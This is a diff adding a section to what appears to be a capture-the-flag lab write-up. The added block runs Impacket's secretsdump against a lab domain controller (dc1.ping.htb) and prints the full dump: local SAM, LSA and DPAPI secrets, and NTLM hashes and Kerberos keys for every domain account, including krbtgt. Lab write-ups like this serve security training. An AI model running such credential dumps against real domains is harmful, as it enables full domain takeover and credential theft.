@@ -1337,6 +1337,148 @@ SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for anot
 evil-winrm-py PS C:\Users\Administrator\Desktop>
 ```
 
+```python
+❯❯❯ faketime -f +8h secretsdump.py ping.htb/Administrator@dc1.ping.htb -k -no-pass
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0xdb05e559e7f28d010d883b880047c313
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:6f537318a530a9bb6e015c8abd8934f3:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+PONG.HTB/C.Carlssen:$DCC2$10240#C.Carlssen#01c3f0d987320e6c12752568ce4fbe0a: (2026-02-05 13:40:25+00:00)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+PING\DC1$:aes256-cts-hmac-sha1-96:7e1352899cf2401de58146cf17f0a38c1896c0029e89bacd9bf196b9b2987fb0
+PING\DC1$:aes128-cts-hmac-sha1-96:4c8a768c8b815e1e705307f83daf0fc7
+PING\DC1$:des-cbc-md5:13fb6e8f89ae7ac4
+PING\DC1$:plain_password_hex:d1da23dcdde17e6968e2ff3944f6137d1bae73fde00b23add96c7703739127a2989a6b37231745492ca4681b8a6f49a95259744cd71cfcff1f3176db0f29f1f0ed03d615dadd99db583fcd1c9eef8e8d9540c517d928ab7049d650be37fe583f1a325755e03699af073b47f3fe00880887d91cb8147a6d52f984758f4a43ae4a0d3964ba0b115ce760af70f9a7ec075393b992300e23d5fb4952df277fce76f0ef65483d6905815426388f40a5b2883727a6f8d57e875ab0f71d0319cf9f57baaa9898db36fb2c0fc8ef27dbacdf49a9746b3bd15621eaae34578e7dc8745f6493eecc2aa34b8cb446f167a1e14af9c5
+PING\DC1$:aad3b435b51404eeaad3b435b51404ee:238f779053e6dc0de47b2aa15089023e:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0xb35a38f7448cb9799526203c15698dfd2b8363f8
+dpapi_userkey:0xb80b93a08c77c104bccc68aff4764bb3ed6d3317
+[*] NL$KM 
+ 0000   38 0B 55 1F 5B 56 3F 38  36 F9 7C 90 96 14 55 1B   8.U.[V?86.|...U.
+ 0010   1B 83 8F D2 E1 A7 C0 2A  62 3C 6E 2F F8 E4 71 EF   .......*b<n/..q.
+ 0020   C8 63 8A 41 E8 3B 77 1E  7B CD 13 19 AD 4E 78 FA   .c.A.;w.{....Nx.
+ 0030   1B 8C DE 11 1B A4 06 F0  DF E0 55 97 8E E7 3B 68   ..........U...;h
+NL$KM:380b551f5b563f3836f97c909614551b1b838fd2e1a7c02a623c6e2ff8e471efc8638a41e83b771e7bcd1319ad4e78fa1b8cde111ba406f0dfe055978ee73b68
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:63905deb12b527aadfdbc26d3f423eff:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d03746770b64696128d1f91b0617aa63:::
+M.Russell:2610:aad3b435b51404eeaad3b435b51404ee:f5db5f47f097ab021ee98a30e242ac5e:::
+G.Lorents:2611:aad3b435b51404eeaad3b435b51404ee:b455ecc1652c11cd5f66e95f39e71b23:::
+Z.Iskam:2612:aad3b435b51404eeaad3b435b51404ee:e50d980fda4d49a973b4327d370f97d1:::
+M.Wallace:2613:aad3b435b51404eeaad3b435b51404ee:56d180be2dbf58b6b6409ff3b7882e29:::
+P.Paul:2614:aad3b435b51404eeaad3b435b51404ee:5ce178304d579bc1327d5b3d561760ef:::
+A.Gordon:2615:aad3b435b51404eeaad3b435b51404ee:48537e9b0cc712176fdb92e813cb5058:::
+P.Klain:2616:aad3b435b51404eeaad3b435b51404ee:d85a2e328ee4eac26e76e6f02cb31ba6:::
+C.Roberts:2617:aad3b435b51404eeaad3b435b51404ee:2475be69d40e815588a85fd89c7a439d:::
+S.Zhoski:2629:aad3b435b51404eeaad3b435b51404ee:361eddef6f02ae10a6313c07937ada22:::
+R.Miller:2630:aad3b435b51404eeaad3b435b51404ee:e220860233958f586ba756cb85676286:::
+A.Adam:2631:aad3b435b51404eeaad3b435b51404ee:b61722e29b5b22f4a4ad7b74e33c9f71:::
+R.Robins:2632:aad3b435b51404eeaad3b435b51404ee:a7020eb3d35dd57f2d17aa1606c2aa40:::
+P.Pollek:2633:aad3b435b51404eeaad3b435b51404ee:274a7166a54f86ee23a1ce06d89646e4:::
+O.Plinski:2634:aad3b435b51404eeaad3b435b51404ee:88e28600eb3b73747ff18038fde405bd:::
+V.Vodomir:2635:aad3b435b51404eeaad3b435b51404ee:82ff8a589f262eb311fd105c241d5c9b:::
+D.MacKenzie:2637:aad3b435b51404eeaad3b435b51404ee:fb1027889ab135ce616421bc56464f1f:::
+P.Vandeval:2638:aad3b435b51404eeaad3b435b51404ee:9200f377c51934d7a32a8b854bab10b5:::
+T.Yang:2639:aad3b435b51404eeaad3b435b51404ee:3ffb8b304717ac77ad5ad50e4e62133e:::
+N.Neri:2640:aad3b435b51404eeaad3b435b51404ee:43fa93d482aa6c2024d22e0c42f3845f:::
+W.Williams:2641:aad3b435b51404eeaad3b435b51404ee:6f2e39ca814870c04acbeb11496ddead:::
+K.Podroski:2642:aad3b435b51404eeaad3b435b51404ee:384ea7cc156e71cc99df84270667bb58:::
+G.James:2643:aad3b435b51404eeaad3b435b51404ee:bf7407879e81380e204200430d68efd6:::
+DC1$:1000:aad3b435b51404eeaad3b435b51404ee:238f779053e6dc0de47b2aa15089023e:::
+gMSA$:2622:aad3b435b51404eeaad3b435b51404ee:13bb99f6205af6bec63d7fe5b4dc7ef5:::
+pong$:2601:aad3b435b51404eeaad3b435b51404ee:98d8af55bbcc9cf8e364bd5a19860487:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:fe77eaeb511e1cf9accc7cae69321ebb80ba330c4f115b34702923f2714d4496
+Administrator:aes128-cts-hmac-sha1-96:78f0835c4f0c282b86fb8c48774aaee4
+Administrator:des-cbc-md5:4ca2da0df40eb9f2
+krbtgt:aes256-cts-hmac-sha1-96:a03b3916abf658bc767fe27655892185cf3ce223ed3425fafa759e7b77e73296
+krbtgt:aes128-cts-hmac-sha1-96:3ad16baca3a7f27bcd79a3e0bd496df8
+krbtgt:des-cbc-md5:c4f7cd83e3255e89
+M.Russell:aes256-cts-hmac-sha1-96:9f7b96c3537b8b5d7475e0867768748931bb53d4f89da2ed6b7cc2a7e17c7932
+M.Russell:aes128-cts-hmac-sha1-96:32e04cd9d373c5435a18bf3aa7100b1b
+M.Russell:des-cbc-md5:1ceff468a83468fb
+G.Lorents:aes256-cts-hmac-sha1-96:8391070b6cf0acf56bc66db54f14745e2089dbc5d0390bd2cffd824a203fbad7
+G.Lorents:aes128-cts-hmac-sha1-96:89075f56b9e987a8b5fa92825c719c3c
+G.Lorents:des-cbc-md5:9d68348c106831e5
+Z.Iskam:aes256-cts-hmac-sha1-96:4f6a9bff5e79bdeae577e854c81b492d3b81d563f3634ffca5b0fb8dcc67773f
+Z.Iskam:aes128-cts-hmac-sha1-96:dc6bb8df891d871052f9a3908598fef5
+Z.Iskam:des-cbc-md5:76d0794320cb51e3
+M.Wallace:aes256-cts-hmac-sha1-96:905043bf92e100b05c9a797b970c938dc980339b071b88a603862bfdfc701eb8
+M.Wallace:aes128-cts-hmac-sha1-96:9b7c1c52bbb0659ed47fcdb0724ec659
+M.Wallace:des-cbc-md5:dc7c10bf453bcd98
+P.Paul:aes256-cts-hmac-sha1-96:1a62f105880eb7fccb92f1c9e2ec49bfe14aad6ac26bee03cd494efcb915648d
+P.Paul:aes128-cts-hmac-sha1-96:046f3ecb73c3fc1bf117569e1b708aee
+P.Paul:des-cbc-md5:e3c70ddaa43e2c7c
+A.Gordon:aes256-cts-hmac-sha1-96:ae39417793a392c16768871139ecc5aa23bc79e9f6f2a0a3ea5e2a3e631cde0b
+A.Gordon:aes128-cts-hmac-sha1-96:d3f492c94349547e7a02cd7f0cc8243c
+A.Gordon:des-cbc-md5:0407bca7d302546d
+P.Klain:aes256-cts-hmac-sha1-96:be46cbb3ced7710db317a61cd1deb69493f0185f67318c157049595968db2fba
+P.Klain:aes128-cts-hmac-sha1-96:9c3eb1fc0abbd12d49dc4e08db81cddf
+P.Klain:des-cbc-md5:2376e69b19fb1010
+C.Roberts:aes256-cts-hmac-sha1-96:1287d579478f88538aaac2163b8d957e7a79c7db2a2068415117b61b830d7a69
+C.Roberts:aes128-cts-hmac-sha1-96:16cf180098a467799138d5ff4f150766
+C.Roberts:des-cbc-md5:8afe04fb760d2a8f
+S.Zhoski:aes256-cts-hmac-sha1-96:525c7eda035297ee847966df8a745e7c3f40bad31862cb0423e7ce0615ecd680
+S.Zhoski:aes128-cts-hmac-sha1-96:43a40dcce3b2ff1b578b541dfc12a34c
+S.Zhoski:des-cbc-md5:07b620f8ef804f91
+R.Miller:aes256-cts-hmac-sha1-96:7353a74aa1e3022f8abc663dcfe84e5b878241f9d4254902e6858f734d8996f9
+R.Miller:aes128-cts-hmac-sha1-96:81c1c0c096d6c85e915464535ee563b6
+R.Miller:des-cbc-md5:c81392bc5b73202c
+A.Adam:aes256-cts-hmac-sha1-96:04091ced1b57eff1ce441d89823e440ce36ed842a4ca25855ef6d3695b746905
+A.Adam:aes128-cts-hmac-sha1-96:7e1cbb5f3508de3379c5c29d2a8e22bd
+A.Adam:des-cbc-md5:85b075131c9b20e6
+R.Robins:aes256-cts-hmac-sha1-96:a8aa4a1a7b516dc5fb66d4cb4b92586592ad9f8c8aeb441d8a726ffecd714197
+R.Robins:aes128-cts-hmac-sha1-96:323550366c8412614c528003e4e45644
+R.Robins:des-cbc-md5:9e4fcdb37362cdce
+P.Pollek:aes256-cts-hmac-sha1-96:80707fa51025e7d6b9b2a78eef80dc8f57adfd7279d318a4a7293120da16cdb9
+P.Pollek:aes128-cts-hmac-sha1-96:cc2d981b2b3a330c31e1f714c2c2c40e
+P.Pollek:des-cbc-md5:5dae528cf70ba737
+O.Plinski:aes256-cts-hmac-sha1-96:68903c7bc5a8befba66d545995ac0528bc4aac83b3dfa6e4b096c10e34fea4bc
+O.Plinski:aes128-cts-hmac-sha1-96:440547a950a2985b2067b70ef4877507
+O.Plinski:des-cbc-md5:91ad681adf4a5457
+V.Vodomir:aes256-cts-hmac-sha1-96:6da880facead97bdcd66c3b25dc21a1aa16f14bf74004bad598a7908104cbe7f
+V.Vodomir:aes128-cts-hmac-sha1-96:fb0c7af60798abfccab24a26ccf65305
+V.Vodomir:des-cbc-md5:314c329716b0ceda
+D.MacKenzie:aes256-cts-hmac-sha1-96:14e32344d295b887832b4cb020645ffded6b9070eccd833768cf48e69164651b
+D.MacKenzie:aes128-cts-hmac-sha1-96:4c3502073333b822ef97cb8fb20c654a
+D.MacKenzie:des-cbc-md5:9bab3b201a6e894c
+P.Vandeval:aes256-cts-hmac-sha1-96:baeb95e5a716c2a418dd0f79ac55a52e6ca98b5a97594c1ba2f847b447effaff
+P.Vandeval:aes128-cts-hmac-sha1-96:f8c79571cbb435be621704471b5e87c9
+P.Vandeval:des-cbc-md5:0bb3a808e662020b
+T.Yang:aes256-cts-hmac-sha1-96:789139902d2f6eac5a429950cb9ee4f3e5878eb92736ef05dba65cfa37a80ebe
+T.Yang:aes128-cts-hmac-sha1-96:dc7ec6a270f452aee9c22dec2e08de3c
+T.Yang:des-cbc-md5:679ea86bd0b0ef5d
+N.Neri:aes256-cts-hmac-sha1-96:75b1fba73117c24d3b2afb22e238ed50b5cecda7c2d2e337cbb5352a14180c13
+N.Neri:aes128-cts-hmac-sha1-96:05674c75ed4821b687a29a7f6420192e
+N.Neri:des-cbc-md5:8c5ec431e092b3f4
+W.Williams:aes256-cts-hmac-sha1-96:37d3b543929d2e8c20848bae188552f0a5ecd8f0f5371eee8ef6a091d5383580
+W.Williams:aes128-cts-hmac-sha1-96:ee3f332388b2aa8f7a666675efe3a0c3
+W.Williams:des-cbc-md5:70433edaa831c8ae
+K.Podroski:aes256-cts-hmac-sha1-96:ab0c6d5bc22fc3ea3edb9bab264c3cce6cad259a75e08346d685e79a6e90b9e8
+K.Podroski:aes128-cts-hmac-sha1-96:10d7af9990a4cf479756cc036957b446
+K.Podroski:des-cbc-md5:2f049dc7eadcfe5d
+G.James:aes256-cts-hmac-sha1-96:6b644e196e1c879240bf20e312368fb4dd7417b4ccda2565416df69939e5cc0a
+G.James:aes128-cts-hmac-sha1-96:6bcb5bc52f85bd548fac190b825b62b3
+G.James:des-cbc-md5:61d673c70770cd62
+DC1$:aes256-cts-hmac-sha1-96:7e1352899cf2401de58146cf17f0a38c1896c0029e89bacd9bf196b9b2987fb0
+DC1$:aes128-cts-hmac-sha1-96:4c8a768c8b815e1e705307f83daf0fc7
+DC1$:des-cbc-md5:f816a78023cbcd92
+gMSA$:aes256-cts-hmac-sha1-96:256a83096bb1f6743b9fedb1616383b6d564c5d5dd85baf6e1d8308522addc55
+gMSA$:aes128-cts-hmac-sha1-96:d15d3503df570694d742b0c61e3c0401
+gMSA$:des-cbc-md5:9e3b9bc215857a75
+pong$:aes256-cts-hmac-sha1-96:31ac84034a64060a216d2c0fbda265892bd41d90dabff122406c0122f7dbf545
+pong$:aes128-cts-hmac-sha1-96:e83cb1978f5334573b74e78ef5dea60f
+pong$:des-cbc-md5:040b2f542c0eabda
+[*] Cleaning up...
+```
+
 Domain Admin!
 
 ![](Pasted%20image%2020261124212443.png)
